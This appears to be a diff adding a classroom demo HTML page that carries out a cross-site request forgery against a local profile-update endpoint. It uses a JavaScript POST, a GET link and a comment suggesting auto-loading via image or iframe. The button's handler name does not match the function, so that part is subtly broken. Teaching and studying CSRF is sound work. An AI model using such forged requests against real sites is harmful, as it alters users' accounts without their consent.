@@ -1,0 +1,31 @@
+<!-- This file performs requests to update the site from an external source -->
+<!-- This file is just hosted by our regular webserver, so the origin is -->
+<!-- the same.  However, without further mitigations we could run any of -->
+<!-- this code from an external site (like the course website, as we did in -->
+<!-- class) and it would work--this is the CSRF attack!. -->
+<DOCTYPE html>
+  <head>
+
+    <!-- POST version:  Here's some javascript we could embed to do the HTTP request -->
+    <script type="text/javascript">
+      function doPost() {
+          xhr = new XMLHttpRequest();
+          xhr.open("POST", "http://localhost:8080/update-post.php", true);
+          xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+          xhr.send("profile-data=wheeeeee");
+      }
+    </script>
+  </head>
+  <body>
+
+    <!-- GET version (as a link) -->
+    <a href="http://localhost:8080/update.php?profile-data=aaabbbbbbb&submit=Update">Click me! (GET version)</a>
+    <!-- Note: we don't have to use a link -->
+    <!-- that the user would click--we could put the URL as an image or an -->
+    <!-- iframe to make it load automatically -->
+
+     <!-- Button to trigger POST version -->
+     <input type="button" value="Click me!!!!! (POST version)" onclick="DoPost();">
+
+  </body>
+</html>
